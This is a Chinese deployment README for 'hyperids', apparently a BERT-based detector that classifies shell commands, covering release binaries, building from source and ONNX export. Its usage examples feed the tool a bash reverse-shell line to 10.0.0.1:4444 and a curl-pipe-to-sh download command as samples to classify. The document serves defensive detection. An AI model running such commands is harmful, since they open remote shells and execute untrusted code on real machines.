# 部署

主发布为 **Rust 单文件二进制**：`deploy/ort_rust_demo/`。

最终模型：`prajjwal1/bert-small`（29.8M）+ 31 标签（verdict 3 + action 28）。
MITRE tactic/technique 由 action 规则表确定性推导，不在模型中预测。

## 发布产物

| 平台 | 资产 |
|---|---|
| macOS aarch64 | `hyperids-darwin-aarch64.tar.gz` |
| macOS x86_64 | `hyperids-darwin-x86_64.tar.gz` |
| Linux aarch64 | `hyperids-linux-aarch64.tar.gz` |
| Linux x86_64 | `hyperids-linux-x86_64.tar.gz` |

安装：

```bash
curl -fsSL https://github.com/ohmydevelop/hyperids/releases/latest/download/install.sh | sh
hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

## 从源码构建 Rust 发布版

模型和词表已经内嵌在 `deploy/ort_rust_demo/`，构建时需要提供 ONNX Runtime 静态库：

```bash
cd deploy/ort_rust_demo
ORT_LIB_LOCATION=/path/to/onnxruntime-static/lib cargo build --release
./target/release/hyperids 'curl -s http://example.com/a.sh | sh'
```

Linux x86_64 可用完全静态链接：

```bash
ORT_LIB_LOCATION=/path/to/onnxruntime-static/lib \
RUSTFLAGS='-C target-feature=+crt-static' \
cargo build --release
```

## ONNX 导出与量化

```bash
python deploy/export_onnx.py \
  --model_dir model/checkpoints_gpu/final_model_v9 \
  --out /tmp/hyperids_v9.onnx --chunk 31 --seq_len 256

python deploy/quantize_int8.py \
  --in /tmp/hyperids_v9.onnx \
  --out /tmp/hyperids_v9_int8.onnx
```

> `seq_len=256` 时命令部分最多约 62 token；长命令需要 seq=512 + 滑动窗口。
